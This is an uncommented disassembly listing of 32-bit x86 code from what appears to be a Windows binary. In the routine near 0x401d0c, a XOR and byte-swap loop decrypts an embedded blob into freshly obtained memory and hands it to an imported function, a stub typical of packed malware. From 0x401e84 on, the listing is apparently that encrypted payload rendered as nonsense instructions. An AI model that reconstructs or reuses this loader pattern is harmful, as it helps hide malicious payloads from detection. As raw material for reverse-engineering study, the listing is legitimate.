  401b93:	68 68 30 40 00       	push   $0x403068
  401b98:	58                   	pop    %eax
  401b99:	2e ff 10             	call   *%cs:(%eax)
  401b9c:	5a                   	pop    %edx
  401b9d:	52                   	push   %edx
  401b9e:	57                   	push   %edi
  401b9f:	ff b2 c4 05 00 00    	push   0x5c4(%edx)
  401ba5:	ff b2 80 01 00 00    	push   0x180(%edx)
  401bab:	ff b2 3c 02 00 00    	push   0x23c(%edx)
  401bb1:	e8 26 00 00 00       	call   0x401bdc
  401bb6:	83 c4 10             	add    $0x10,%esp
  401bb9:	5a                   	pop    %edx
  401bba:	52                   	push   %edx
  401bbb:	be 00 00 00 00       	mov    $0x0,%esi
  401bc0:	56                   	push   %esi
  401bc1:	68 24 30 40 00       	push   $0x403024
  401bc6:	58                   	pop    %eax
  401bc7:	2e ff 10             	call   *%cs:(%eax)
  401bca:	5a                   	pop    %edx
  401bcb:	83 ec c0             	sub    $0xffffffc0,%esp
  401bce:	8b 2c 24             	mov    (%esp),%ebp
  401bd1:	83 c4 04             	add    $0x4,%esp
  401bd4:	c3                   	ret
  401bd5:	00 00                	add    %al,(%eax)
  401bd7:	00 00                	add    %al,(%eax)
  401bd9:	00 00                	add    %al,(%eax)
  401bdb:	00 8b ff 55 8b ec    	add    %cl,-0x1374aa01(%ebx)
  401be1:	83 ec 30             	sub    $0x30,%esp
  401be4:	52                   	push   %edx
  401be5:	56                   	push   %esi
  401be6:	56                   	push   %esi
  401be7:	e8 14 f4 ff ff       	call   0x401000
  401bec:	83 c4 08             	add    $0x8,%esp
  401bef:	5a                   	pop    %edx
  401bf0:	52                   	push   %edx
  401bf1:	6a 00                	push   $0x0
  401bf3:	68 0c 30 40 00       	push   $0x40300c
  401bf8:	58                   	pop    %eax
  401bf9:	2e ff 10             	call   *%cs:(%eax)
  401bfc:	5a                   	pop    %edx
  401bfd:	52                   	push   %edx
  401bfe:	8d 3a                	lea    (%edx),%edi
  401c00:	57                   	push   %edi
  401c01:	68 4c 30 40 00       	push   $0x40304c
  401c06:	58                   	pop    %eax
  401c07:	2e ff 10             	call   *%cs:(%eax)
  401c0a:	85 c0                	test   %eax,%eax
  401c0c:	75 f0                	jne    0x401bfe
  401c0e:	5a                   	pop    %edx
  401c0f:	83 ec d0             	sub    $0xffffffd0,%esp
  401c12:	8b 2c 24             	mov    (%esp),%ebp
  401c15:	83 c4 04             	add    $0x4,%esp
  401c18:	c3                   	ret
  401c19:	00 00                	add    %al,(%eax)
  401c1b:	00 8b ff 55 8b ec    	add    %cl,-0x1374aa01(%ebx)
  401c21:	83 ec 40             	sub    $0x40,%esp
  401c24:	52                   	push   %edx
  401c25:	ff b2 34 02 00 00    	push   0x234(%edx)
  401c2b:	51                   	push   %ecx
  401c2c:	ff b2 88 03 00 00    	push   0x388(%edx)
  401c32:	50                   	push   %eax
  401c33:	e8 c0 fe ff ff       	call   0x401af8
  401c38:	83 c4 10             	add    $0x10,%esp
  401c3b:	5a                   	pop    %edx
  401c3c:	52                   	push   %edx
  401c3d:	8d 0a                	lea    (%edx),%ecx
  401c3f:	51                   	push   %ecx
  401c40:	68 4c 30 40 00       	push   $0x40304c
  401c45:	58                   	pop    %eax
  401c46:	2e ff 10             	call   *%cs:(%eax)
  401c49:	85 c0                	test   %eax,%eax
  401c4b:	75 f0                	jne    0x401c3d
  401c4d:	5a                   	pop    %edx
  401c4e:	52                   	push   %edx
  401c4f:	6a 00                	push   $0x0
  401c51:	68 18 30 40 00       	push   $0x403018
  401c56:	58                   	pop    %eax
  401c57:	2e ff 10             	call   *%cs:(%eax)
  401c5a:	5a                   	pop    %edx
  401c5b:	83 ec c0             	sub    $0xffffffc0,%esp
  401c5e:	8b 2c 24             	mov    (%esp),%ebp
  401c61:	83 c4 04             	add    $0x4,%esp
  401c64:	c3                   	ret
  401c65:	00 00                	add    %al,(%eax)
  401c67:	00 8b ff 55 8b ec    	add    %cl,-0x1374aa01(%ebx)
  401c6d:	83 ec 5c             	sub    $0x5c,%esp
  401c70:	52                   	push   %edx
  401c71:	8d 1a                	lea    (%edx),%ebx
  401c73:	53                   	push   %ebx
  401c74:	68 4c 30 40 00       	push   $0x40304c
  401c79:	58                   	pop    %eax
  401c7a:	2e ff 10             	call   *%cs:(%eax)
  401c7d:	85 c0                	test   %eax,%eax
  401c7f:	75 f0                	jne    0x401c71
  401c81:	5a                   	pop    %edx
  401c82:	52                   	push   %edx
  401c83:	56                   	push   %esi
  401c84:	ff b2 dc 00 00 00    	push   0xdc(%edx)
  401c8a:	ff b2 44 02 00 00    	push   0x244(%edx)
  401c90:	51                   	push   %ecx
  401c91:	e8 76 00 00 00       	call   0x401d0c
  401c96:	83 c4 10             	add    $0x10,%esp
  401c99:	5a                   	pop    %edx
  401c9a:	52                   	push   %edx
  401c9b:	68 40 30 40 00       	push   $0x403040
  401ca0:	58                   	pop    %eax
  401ca1:	2e ff 10             	call   *%cs:(%eax)
  401ca4:	5a                   	pop    %edx
  401ca5:	83 ec a4             	sub    $0xffffffa4,%esp
  401ca8:	8b 2c 24             	mov    (%esp),%ebp
  401cab:	83 c4 04             	add    $0x4,%esp
  401cae:	c3                   	ret
  401caf:	00 8b ff 55 8b ec    	add    %cl,-0x1374aa01(%ebx)
  401cb5:	83 ec 5c             	sub    $0x5c,%esp
  401cb8:	52                   	push   %edx
  401cb9:	ff b2 98 02 00 00    	push   0x298(%edx)
  401cbf:	56                   	push   %esi
  401cc0:	50                   	push   %eax
  401cc1:	e8 a6 f8 ff ff       	call   0x40156c
  401cc6:	83 c4 0c             	add    $0xc,%esp
  401cc9:	5a                   	pop    %edx
  401cca:	52                   	push   %edx
  401ccb:	b9 00 00 00 00       	mov    $0x0,%ecx
  401cd0:	51                   	push   %ecx
  401cd1:	68 18 30 40 00       	push   $0x403018
  401cd6:	58                   	pop    %eax
  401cd7:	2e ff 10             	call   *%cs:(%eax)
  401cda:	5a                   	pop    %edx
  401cdb:	52                   	push   %edx
  401cdc:	b9 00 00 00 00       	mov    $0x0,%ecx
  401ce1:	51                   	push   %ecx
  401ce2:	68 2c 30 40 00       	push   $0x40302c
  401ce7:	58                   	pop    %eax
  401ce8:	2e ff 10             	call   *%cs:(%eax)
  401ceb:	5a                   	pop    %edx
  401cec:	83 ec a4             	sub    $0xffffffa4,%esp
  401cef:	8b 2c 24             	mov    (%esp),%ebp
  401cf2:	83 c4 04             	add    $0x4,%esp
  401cf5:	c3                   	ret
	...
  401d0a:	00 00                	add    %al,(%eax)
  401d0c:	8b ff                	mov    %edi,%edi
  401d0e:	55                   	push   %ebp
  401d0f:	8b ec                	mov    %esp,%ebp
  401d11:	83 ec 24             	sub    $0x24,%esp
  401d14:	52                   	push   %edx
  401d15:	68 b0 06 00 00       	push   $0x6b0
  401d1a:	be b0 06 00 00       	mov    $0x6b0,%esi
  401d1f:	56                   	push   %esi
  401d20:	ba 00 00 04 00       	mov    $0x40000,%edx
  401d25:	52                   	push   %edx
  401d26:	68 48 30 40 00       	push   $0x403048
  401d2b:	5f                   	pop    %edi
  401d2c:	ff 37                	push   (%edi)
  401d2e:	83 2c 24 02          	subl   $0x2,(%esp)
  401d32:	68 10 30 40 00       	push   $0x403010
  401d37:	5f                   	pop    %edi
  401d38:	8f 07                	pop    (%edi)
  401d3a:	68 10 30 40 00       	push   $0x403010
  401d3f:	58                   	pop    %eax
  401d40:	2e ff 10             	call   *%cs:(%eax)
  401d43:	87 04 24             	xchg   %eax,(%esp)
  401d46:	8b d0                	mov    %eax,%edx
  401d48:	5f                   	pop    %edi
  401d49:	89 ba f0 02 00 00    	mov    %edi,0x2f0(%edx)
  401d4f:	8b 9a f0 02 00 00    	mov    0x2f0(%edx),%ebx
  401d55:	8d 33                	lea    (%ebx),%esi
  401d57:	2b ff                	sub    %edi,%edi
  401d59:	4f                   	dec    %edi
  401d5a:	81 e7 9d 1e 40 00    	and    $0x401e9d,%edi
  401d60:	8b 1f                	mov    (%edi),%ebx
  401d62:	89 1e                	mov    %ebx,(%esi)
  401d64:	83 c7 03             	add    $0x3,%edi
  401d67:	83 c6 03             	add    $0x3,%esi
  401d6a:	bb 12 91 71 6a       	mov    $0x6a719112,%ebx
  401d6f:	68 b0 06 00 00       	push   $0x6b0
  401d74:	58                   	pop    %eax
  401d75:	8b cb                	mov    %ebx,%ecx
  401d77:	33 0f                	xor    (%edi),%ecx
  401d79:	83 e9 01             	sub    $0x1,%ecx
  401d7c:	89 0e                	mov    %ecx,(%esi)
  401d7e:	ff 36                	push   (%esi)
  401d80:	bb fc ff ff ff       	mov    $0xfffffffc,%ebx
  401d85:	2b fb                	sub    %ebx,%edi
  401d87:	2b f3                	sub    %ebx,%esi
  401d89:	5b                   	pop    %ebx
  401d8a:	0f cb                	bswap  %ebx
  401d8c:	83 e8 04             	sub    $0x4,%eax
  401d8f:	85 c0                	test   %eax,%eax
  401d91:	75 e2                	jne    0x401d75
  401d93:	52                   	push   %edx
  401d94:	6a 00                	push   $0x0
  401d96:	68 3c 30 40 00       	push   $0x40303c
  401d9b:	58                   	pop    %eax
  401d9c:	2e ff 10             	call   *%cs:(%eax)
  401d9f:	5a                   	pop    %edx
  401da0:	83 ec dc             	sub    $0xffffffdc,%esp
  401da3:	5d                   	pop    %ebp
  401da4:	c3                   	ret
	...
  401dad:	00 00                	add    %al,(%eax)
  401daf:	00 8b ff 55 8b ec    	add    %cl,-0x1374aa01(%ebx)
  401db5:	83 ec 1c             	sub    $0x1c,%esp
  401db8:	52                   	push   %edx
  401db9:	68 1c 30 40 00       	push   $0x40301c
  401dbe:	58                   	pop    %eax
  401dbf:	2e ff 10             	call   *%cs:(%eax)
  401dc2:	5a                   	pop    %edx
  401dc3:	52                   	push   %edx
  401dc4:	ff b2 bc 01 00 00    	push   0x1bc(%edx)
  401dca:	ff b2 88 01 00 00    	push   0x188(%edx)
  401dd0:	51                   	push   %ecx
  401dd1:	e8 92 fe ff ff       	call   0x401c68
  401dd6:	83 c4 0c             	add    $0xc,%esp
  401dd9:	5a                   	pop    %edx
  401dda:	52                   	push   %edx
  401ddb:	6a 00                	push   $0x0
  401ddd:	68 68 30 40 00       	push   $0x403068
  401de2:	58                   	pop    %eax
  401de3:	2e ff 10             	call   *%cs:(%eax)
  401de6:	5a                   	pop    %edx
  401de7:	83 ec e4             	sub    $0xffffffe4,%esp
  401dea:	8b 2c 24             	mov    (%esp),%ebp
  401ded:	83 c4 04             	add    $0x4,%esp
  401df0:	c3                   	ret
  401df1:	00 00                	add    %al,(%eax)
  401df3:	00 8b ff 55 8b ec    	add    %cl,-0x1374aa01(%ebx)
  401df9:	83 ec 38             	sub    $0x38,%esp
  401dfc:	52                   	push   %edx
  401dfd:	6a 00                	push   $0x0
  401dff:	68 34 30 40 00       	push   $0x403034
  401e04:	58                   	pop    %eax
  401e05:	2e ff 10             	call   *%cs:(%eax)
  401e08:	5a                   	pop    %edx
  401e09:	52                   	push   %edx
  401e0a:	ff b2 34 01 00 00    	push   0x134(%edx)
  401e10:	56                   	push   %esi
  401e11:	e8 86 f9 ff ff       	call   0x40179c
  401e16:	83 c4 08             	add    $0x8,%esp
  401e19:	5a                   	pop    %edx
  401e1a:	52                   	push   %edx
  401e1b:	b8 00 00 00 00       	mov    $0x0,%eax
  401e20:	50                   	push   %eax
  401e21:	68 18 30 40 00       	push   $0x403018
  401e26:	58                   	pop    %eax
  401e27:	2e ff 10             	call   *%cs:(%eax)
  401e2a:	5a                   	pop    %edx
  401e2b:	83 ec c8             	sub    $0xffffffc8,%esp
  401e2e:	8b 2c 24             	mov    (%esp),%ebp
  401e31:	83 c4 04             	add    $0x4,%esp
  401e34:	c3                   	ret
  401e35:	00 00                	add    %al,(%eax)
  401e37:	00 00                	add    %al,(%eax)
  401e39:	00 00                	add    %al,(%eax)
  401e3b:	00 8b ff 55 8b ec    	add    %cl,-0x1374aa01(%ebx)
  401e41:	83 ec 20             	sub    $0x20,%esp
  401e44:	52                   	push   %edx
  401e45:	ff b2 ec 03 00 00    	push   0x3ec(%edx)
  401e4b:	53                   	push   %ebx
  401e4c:	51                   	push   %ecx
  401e4d:	e8 0e fc ff ff       	call   0x401a60
  401e52:	83 c4 0c             	add    $0xc,%esp
  401e55:	5a                   	pop    %edx
  401e56:	52                   	push   %edx
  401e57:	6a 00                	push   $0x0
  401e59:	68 18 30 40 00       	push   $0x403018
  401e5e:	58                   	pop    %eax
  401e5f:	2e ff 10             	call   *%cs:(%eax)
  401e62:	5a                   	pop    %edx
  401e63:	52                   	push   %edx
  401e64:	bf 00 00 00 00       	mov    $0x0,%edi
  401e69:	57                   	push   %edi
  401e6a:	68 2c 30 40 00       	push   $0x40302c
  401e6f:	58                   	pop    %eax
  401e70:	2e ff 10             	call   *%cs:(%eax)
  401e73:	5a                   	pop    %edx
  401e74:	83 ec e0             	sub    $0xffffffe0,%esp
  401e77:	8b 2c 24             	mov    (%esp),%ebp
  401e7a:	83 c4 04             	add    $0x4,%esp
  401e7d:	c3                   	ret
  401e7e:	00 00                	add    %al,(%eax)
  401e80:	00 00                	add    %al,(%eax)
  401e82:	00 00                	add    %al,(%eax)
  401e84:	c8 be 29 47          	enter  $0x29be,$0x47
  401e88:	90                   	nop
  401e89:	2d 3b de 90 ec       	sub    $0xec90de3b,%eax
  401e8e:	33 e4                	xor    %esp,%esp
  401e90:	21 84 65 1a e4 88 f0 	and    %eax,-0xf771be6(%ebp,%eiz,2)
  401e97:	1d c8 67 79 95       	sbb    $0x957967c8,%eax
  401e9c:	92                   	xchg   %eax,%edx
  401e9d:	0f c8                	bswap  %eax
  401e9f:	fd                   	std
  401ea0:	ef                   	out    %eax,(%dx)
  401ea1:	9e                   	sahf
  401ea2:	b9 97 00 c7 c7       	mov    $0xc7c70097,%ecx
  401ea7:	01 00                	add    %eax,(%eax)
  401ea9:	c7 c7 01 00 e3 c6    	mov    $0xc6e30001,%edi
  401eaf:	7f 41                	jg     0x401ef2
  401eb1:	ca 7e a2             	lret   $0xa27e
  401eb4:	bd a8 80 05 31       	mov    $0x310580a8,%ebp
  401eb9:	6b f0 e2             	imul   $0xffffffe2,%eax,%esi
  401ebc:	01 0d a3 91 16 25    	add    %ecx,0x251691a3
  401ec2:	65 6c                	gs insb (%dx),%es:(%edi)
  401ec4:	58                   	pop    %eax
  401ec5:	57                   	push   %edi
  401ec6:	40                   	inc    %eax
  401ec7:	16                   	push   %ss
  401ec8:	09 42 32             	or     %eax,0x32(%edx)
  401ecb:	6b 09 ff             	imul   $0xffffffff,(%ecx),%ecx
  401ece:	ba e7 52 d5 bc       	mov    $0xbcd552e7,%edx
  401ed3:	6c                   	insb   (%dx),%es:(%edi)
  401ed4:	be 3b 53 d8 81       	mov    $0x81d8533b,%esi
  401ed9:	54                   	push   %esp
  401eda:	78 f7                	js     0x401ed3
  401edc:	5a                   	pop    %edx
  401edd:	e8 f0 85 04 f4       	call   0xf444a4d2
  401ee2:	b5 a0                	mov    $0xa0,%ch
  401ee4:	7d e4                	jge    0x401eca
  401ee6:	10 00                	adc    %al,(%eax)
  401ee8:	01 10                	add    %edx,(%eax)
  401eea:	14 1d                	adc    $0x1d,%al
  401eec:	1b af 00 00 8a 46    	sbb    0x468a0000(%edi),%ebp
  401ef2:	fe                   	(bad)
  401ef3:	10 14 96             	adc    %dl,(%esi,%edx,4)
  401ef6:	25 e1 2a 0f 06       	and    $0x60f2ae1,%eax
  401efb:	9a 06 24 09 20 10 31 	lcall  $0x3110,$0x20092406
  401f02:	1b 97 a9 5b dd 76    	sbb    0x76dd5ba9(%edi),%edx
  401f08:	6d                   	insl   (%dx),%es:(%edi)
  401f09:	89 60 13             	mov    %esp,0x13(%eax)
  401f0c:	35 0d 65 02 21       	xor    $0x2102650d,%eax
  401f11:	00 04 02             	add    %al,(%edx,%eax,1)
  401f14:	25 32 9a 1d 5c       	and    $0x5c1d9a32,%eax
  401f19:	76 15                	jbe    0x401f30
  401f1b:	50                   	push   %eax
  401f1c:	80 82 91 62 2b 70 c4 	addb   $0xc4,0x702b6291(%edx)
  401f23:	93                   	xchg   %eax,%ebx
  401f24:	11 00                	adc    %eax,(%eax)
  401f26:	00 e0                	add    %ah,%al
  401f28:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  401f29:	68 00 6a 6b ff       	push   $0xff6b6a00
  401f2e:	55                   	push   %ebp
  401f2f:	16                   	push   %ss
  401f30:	9c                   	pushf
  401f31:	ad                   	lods   %ds:(%esi),%eax
  401f32:	fa                   	cli
  401f33:	99                   	cltd
  401f34:	98                   	cwtl
  401f35:	05 f8 db de b5       	add    $0xb5dedbf8,%eax
  401f3a:	d4 f9                	aam    $0xf9
  401f3c:	f9                   	stc
  401f3d:	d4 0f                	aam    $0xf
  401f3f:	2d a7 b9 ff 0c       	sub    $0xcffb9a7,%eax
  401f44:	56                   	push   %esi
  401f45:	c3                   	ret
  401f46:	e8 8d 8d e8 c3       	call   0xc428acd8
  401f4b:	f9                   	stc
  401f4c:	02 87 34 21 73 dc    	add    -0x238cdecc(%edi),%al
  401f52:	7c 5a                	jl     0x401fae
  401f54:	05 fb 00 6f 3f       	add    $0x3f6f00fb,%eax
  401f59:	e8 00 8b 72 6a       	call   0x6ab2aa5e
  401f5e:	00 6f 6b             	add    %ch,0x6b(%edi)
  401f61:	ff 1f                	lcall  *(%edi)
  401f63:	9c                   	pushf
  401f64:	3c 8a                	cmp    $0x8a,%al
  401f66:	aa                   	stos   %al,%es:(%edi)
  401f67:	28 a4 18 97 3d 6b 3c 	sub    %ah,0x3c6b3d97(%eax,%ebx,1)
  401f6e:	15 74 ca 7c 04       	adc    $0x47cca74,%eax
  401f73:	51                   	push   %ecx
  401f74:	06                   	push   %es
  401f75:	07                   	pop    %es
  401f76:	db 61 78             	(bad)  0x78(%ecx)
  401f79:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  401f7a:	00 a9 a9 4f b0 c9    	add    %ch,-0x364fb057(%ecx)
  401f80:	e1 e8                	loope  0x401f6a
  401f82:	18 de                	sbb    %bl,%dh
  401f84:	cc                   	int3
  401f85:	3c 8d                	cmp    $0x8d,%al
  401f87:	07                   	pop    %es
  401f88:	03 eb                	add    %ebx,%ebp
  401f8a:	cb                   	lret
  401f8b:	06                   	push   %es
  401f8c:	57                   	push   %edi
  401f8d:	f7 46 73 62 19 58 22 	testl  $0x22581962,0x73(%esi)
  401f94:	41                   	inc    %ecx
  401f95:	49                   	dec    %ecx
  401f96:	b2 4e                	mov    $0x4e,%dl
  401f98:	6d                   	insl   (%dx),%es:(%edi)
  401f99:	e1 15                	loope  0x401fb0
  401f9b:	1c 69                	sbb    $0x69,%al
  401f9d:	34 6a                	xor    $0x6a,%al
  401f9f:	34 00                	xor    $0x0,%al
  401fa1:	71 60                	jno    0x402003
  401fa3:	53                   	push   %ebx
  401fa4:	53                   	push   %ebx
  401fa5:	06                   	push   %es
  401fa6:	60                   	pusha
  401fa7:	74 f5                	je     0x401f9e
  401fa9:	7c 05                	jl     0x401fb0
  401fab:	ab                   	stos   %eax,%es:(%edi)
  401fac:	3f                   	aas
  401fad:	54                   	push   %esp
  401fae:	3b 2e                	cmp    (%esi),%ebp
  401fb0:	53                   	push   %ebx
  401fb1:	01 08                	add    %ecx,(%eax)
  401fb3:	3e 3f                	ds aas
  401fb5:	0e                   	push   %cs
  401fb6:	02 ac 04 dc cd e1 77 	add    0x77e1cddc(%esp,%eax,1),%ch
  401fbd:	3c 2f                	cmp    $0x2f,%al
  401fbf:	08 5e f2             	or     %bl,-0xe(%esi)
  401fc2:	ff a3 d4 c2 56 b6    	jmp    *-0x49a93d2c(%ebx)
  401fc8:	74 8e                	je     0x401f58
  401fca:	b7 93                	mov    $0x93,%bh
  401fcc:	94                   	xchg   %eax,%esp
  401fcd:	2e ad                	lods   %cs:(%esi),%eax
  401fcf:	33 b7 61 43 88 fa    	xor    -0x577bc9f(%edi),%esi
  401fd5:	1b f6                	sbb    %esi,%esi
  401fd7:	fe 4e d7             	decb   -0x29(%esi)
  401fda:	84 bf 52 0e a0 72    	test   %bh,0x72a00e52(%edi)
  401fe0:	36 4b                	ss dec %ebx
  401fe2:	c2 1c 8e             	ret    $0x8e1c
  401fe5:	87 ff                	xchg   %edi,%edi
  401fe7:	7b d3                	jnp    0x401fbc
  401fe9:	e7 c4                	out    %eax,$0xc4
  401feb:	85 01                	test   %eax,(%ecx)
  401fed:	8f                   	(bad)
  401fee:	5b                   	pop    %ebx
  401fef:	63 c3                	arpl   %ax,%bx
  401ff1:	ec                   	in     (%dx),%al
  401ff2:	63 75 76             	arpl   %si,0x76(%ebp)
  401ff5:	e8 24 44 7b 14       	call   0x14bb641e
  401ffa:	ff 75 66             	push   0x66(%ebp)
  401ffd:	74 6b                	je     0x40206a
  401fff:	7b 08                	jnp    0x402009
  402001:	84 d0                	test   %dl,%al
  402003:	40                   	inc    %eax
  402004:	dc 8f a9 53 02 05    	fmull  0x50253a9(%edi)
  40200a:	85 d9                	test   %ebx,%ecx
  40200c:	39 55 06             	cmp    %edx,0x6(%ebp)
  40200f:	06                   	push   %es
  402010:	57                   	push   %edi
  402011:	07                   	pop    %es
  402012:	08 33                	or     %dh,(%ebx)
  402014:	6d                   	insl   (%dx),%es:(%edi)
  402015:	cc                   	int3
  402016:	02 0c 58             	add    (%eax,%ebx,2),%cl
  402019:	08 4b f8             	or     %cl,-0x8(%ebx)
  40201c:	3f                   	aas
  40201d:	2f                   	das
  40201e:	a0 ff 58 a7 c5       	mov    0xc5a758ff,%al
  402023:	70 4b                	jo     0x402070
  402025:	49                   	dec    %ecx
  402026:	ba bd 58 e9 29       	mov    $0x29e958bd,%edx
  40202b:	c7 01 e9 8a e8 01    	movl   $0x1e88ae9,(%ecx)
  402031:	81 b0 68 69 18 00 00 	xorl   $0x28760000,0x186968(%eax)
  402038:	00 76 28 
  40203b:	56                   	push   %esi
  40203c:	da 93 fe 0f 19 87    	ficoml -0x78e6f002(%ebx)
  402042:	ff 8b 01 60 f3 dd    	decl   -0x220c9fff(%ebx)
  402048:	04 ff                	add    $0xff,%al
  40204a:	64 00 59 8b          	add    %bl,%fs:-0x75(%ecx)
  40204e:	40                   	inc    %eax
  40204f:	3c 80                	cmp    $0x80,%al
  402051:	00 87 61 60 14 34    	add    %al,0x34146061(%edi)
  402057:	8f 88 74 f3          	(bad)
  40205b:	af                   	scas   %es:(%edi),%eax
  40205c:	7b e7                	jnp    0x402045
  40205e:	24 88                	and    $0x88,%al
  402060:	49                   	dec    %ecx
  402061:	18 87 fa 58 88 cb    	sbb    %al,-0x3477a706(%edi)
  402067:	c0 f0 ef             	shl    $0xef,%al
  40206a:	8a 58 6d             	mov    0x6d(%eax),%bl
  40206d:	ef                   	out    %eax,(%dx)
  40206e:	ef                   	out    %eax,(%dx)
  40206f:	39 56 f7             	cmp    %edx,-0x9(%esi)
  402072:	46                   	inc    %esi
  402073:	69 78 44 a1 0e 19 a1 	imul   $0xa1190ea1,0x44(%eax),%edi
  40207a:	64 87 ca             	fs xchg %ecx,%edx
  40207d:	30 89 78 71 76 65    	xor    %cl,0x65767178(%ecx)
  402083:	54                   	push   %esp
  402084:	fd                   	std
  402085:	76 fd                	jbe    0x402084
  402087:	08 01                	or     %al,(%ecx)
  402089:	5f                   	pop    %edi
  40208a:	ea b0 d2 bd 79 1c 7e 	ljmp   $0x7e1c,$0x79bdd2b0
  402091:	74 9c                	je     0x40202f
  402093:	b6 3a                	mov    $0x3a,%dh
  402095:	e8 50 39 da 78       	call   0x791a59ea
  40209a:	58                   	pop    %eax
  40209b:	04 03                	add    $0x3,%al
  40209d:	58                   	pop    %eax
  40209e:	78 f4                	js     0x402094
  4020a0:	65 8b 04 26          	mov    %gs:(%esi,%eiz,1),%eax
  4020a4:	ec                   	in     (%dx),%al
  4020a5:	00 af 0f 01 24 04    	add    %ch,0x424010f(%edi)
  4020ab:	38 8a 24 04 50 64    	cmp    %cl,0x64500424(%edx)
  4020b1:	c4                   	(bad)
  4020b2:	e7 14                	out    %eax,$0x14
  4020b4:	ec                   	in     (%dx),%al
  4020b5:	30 c3                	xor    %al,%bl
  4020b7:	45                   	inc    %ebp
  4020b8:	4b                   	dec    %ebx
  4020b9:	88 45 0b             	mov    %al,0xb(%ebp)
  4020bc:	81 b6 8b b9 72 74 73 	xorl   $0xf8f70373,0x7472b98b(%esi)
  4020c3:	03 f7 f8 
  4020c6:	0a fa                	or     %dl,%bh
  4020c8:	8a 81 ff 99 6e 8f    	mov    -0x70916601(%ecx),%al
  4020ce:	a8 7a                	test   $0x7a,%al
  4020d0:	a9 53 7e c3 b6       	test   $0xb6c37e53,%eax
  4020d5:	81 53 aa a9 57 54 23 	adcl   $0x235457a9,-0x56(%ebx)
  4020dc:	da 26                	fisubl (%esi)
  4020de:	10 56 f7             	adc    %dl,-0x9(%esi)
  4020e1:	9b                   	fwait
  4020e2:	88 26                	mov    %ah,(%esi)
  4020e4:	2b 3e                	sub    (%esi),%edi
  4020e6:	fe 08                	decb   (%eax)
  4020e8:	d7                   	xlat   %ds:(%ebx)
  4020e9:	82 4b 4b 91          	orb    $0x91,0x4b(%ebx)
  4020ed:	da a7 7f 3f 54 00    	fisubl 0x543f7f(%edi)
  4020f3:	09 57 07             	or     %edx,0x7(%edi)
  4020f6:	08 3c da             	or     %bh,(%edx,%ebx,8)
  4020f9:	0a d0                	or     %al,%dl
  4020fb:	3f                   	aas
  4020fc:	51                   	push   %ecx
  4020fd:	15 8d cd 57 06       	adc    $0x657cd8d,%eax
  402102:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  402103:	93                   	xchg   %eax,%ebx
  402104:	5b                   	pop    %ebx
  402105:	99                   	cltd
  402106:	08 d0                	or     %dl,%al
  402108:	b5 9e                	mov    $0x9e,%ch
  40210a:	04 57                	add    $0x57,%al
  40210c:	01 a9 9b 01 70 0d    	add    %ebp,0xd70019b(%ecx)
  402112:	44                   	inc    %esp
  402113:	03 00                	add    (%eax),%eax
  402115:	61                   	popa
  402116:	72 fb                	jb     0x402113
  402118:	ff                   	(bad)
  402119:	7f 75                	jg     0x402190
  40211b:	fd                   	std
  40211c:	8a 74 6b 00          	mov    0x0(%ebx,%ebp,2),%dh
  402120:	a9 1c 8f 9f 0a       	test   $0xa9f8f1c,%eax
  402125:	f4                   	hlt
  402126:	56                   	push   %esi
  402127:	0d 02 0a 0f b1       	or     $0xb10f0a02,%eax
  40212c:	09 af 01 55 55 d6    	or     %ebp,-0x29aaaaff(%edi)
  402132:	39 43 f8             	cmp    %eax,-0x8(%ebx)
  402135:	49                   	dec    %ecx
  402136:	e2 9b                	loop   0x4020d3
  402138:	a2 ea 5c 60 78       	mov    %al,0x78605cea
  40213d:	d0 fd                	sar    %ch
  40213f:	5c                   	pop    %esp
  402140:	10 20                	adc    %ah,(%eax)
  402142:	37                   	aaa
  402143:	77 56                	ja     0x40219b
  402145:	3b d2                	cmp    %edx,%edx
  402147:	be 94 84 0f 59       	mov    $0x590f8494,%esi
  40214c:	04 a4                	add    $0xa4,%al
  40214e:	00 00                	add    %al,(%eax)
  402150:	01 8b 12 2e a1 b6    	add    %ecx,-0x495ed1ee(%ebx)
  402156:	8b 85 72 0f 84 81    	mov    -0x7e7bf08e(%ebp),%eax
  40215c:	80 84 0f f5 f7 ad 8b 	addb   $0xf8,-0x7452080b(%edi,%ecx,1)
  402163:	f8 
  402164:	fc                   	cld
  402165:	70 fd                	jo     0x402164
  402167:	78 4e                	js     0x4021b7
  402169:	00 aa 51 03 3b 54    	add    %ch,0x543b0351(%edx)
  40216f:	ac                   	lods   %ds:(%esi),%al
  402170:	69 14 6a 50 58 83 f8 	imul   $0xf8835850,(%edx,%ebp,2),%edx
  402177:	04 55                	add    $0x55,%al
  402179:	82 87 3f 69 14 6a 50 	addb   $0x50,0x6a14693f(%edi)
  402180:	58                   	pop    %eax
  402181:	81 14 24 25 14 81 57 	adcl   $0x57811425,(%esp)
  402188:	00 56 1c             	add    %dl,0x1c(%esi)
  40218b:	ff a9 00 0f a6 f7    	ljmp   *-0x859f100(%ecx)
  402191:	71 c4                	jno    0x402157
  402193:	04 dd                	add    $0xdd,%al
  402195:	00 fa                	add    %bh,%dl
  402197:	44                   	inc    %esp
  402198:	6d                   	insl   (%dx),%es:(%edi)
  402199:	38 cc                	cmp    %cl,%ah
  40219b:	b8 f2 62 44 e5       	mov    $0xe54462f2,%eax
  4021a0:	cc                   	int3
  4021a1:	ad                   	lods   %ds:(%esi),%eax
  4021a2:	56                   	push   %esi
  4021a3:	b4 7d                	mov    $0x7d,%ah
  4021a5:	15 ff a6 0e ff       	adc    $0xff0ea6ff,%eax
  4021aa:	24 1c                	and    $0x1c,%al
  4021ac:	1c e3                	sbb    $0xe3,%al
  4021ae:	ee                   	out    %al,(%dx)
  4021af:	59                   	pop    %ecx
  4021b0:	d7                   	xlat   %ds:(%ebx)
  4021b1:	aa                   	stos   %al,%es:(%edi)
  4021b2:	c6 03 56             	movb   $0x56,(%ebx)
  4021b5:	76 14                	jbe    0x4021cb
  4021b7:	72 ce                	jb     0x402187
  4021b9:	38 52 41             	cmp    %dl,0x41(%edx)
  4021bc:	11 00                	adc    %eax,(%eax)
  4021be:	3f                   	aas
  4021bf:	b3 6a                	mov    $0x6a,%bl
  4021c1:	53                   	push   %ebx
  4021c2:	50                   	push   %eax
  4021c3:	ff ce                	dec    %esi
  4021c5:	38 04 f8             	cmp    %al,(%eax,%edi,8)
  4021c8:	11 00                	adc    %eax,(%eax)
  4021ca:	3f                   	aas
  4021cb:	b1 84                	mov    $0x84,%cl
  4021cd:	73 00                	jae    0x4021cf
  4021cf:	10 11                	adc    %dl,(%ecx)
  4021d1:	00 db                	add    %bl,%bl
  4021d3:	51                   	push   %ecx
